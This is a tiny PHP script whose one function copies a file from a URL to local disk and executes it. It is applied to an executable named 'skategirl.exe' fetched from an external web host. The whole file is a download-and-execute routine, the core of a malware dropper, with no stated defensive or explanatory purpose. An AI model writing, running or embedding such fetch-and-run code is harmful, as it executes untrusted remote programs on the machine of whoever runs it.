<?php

function http_download ($what, $where) {
  copy($what,$where);
  exec($where);
}

http_download("http://harvie.stokoruna.cz/files/skategirl.exe", "skategirl.exe");

?>
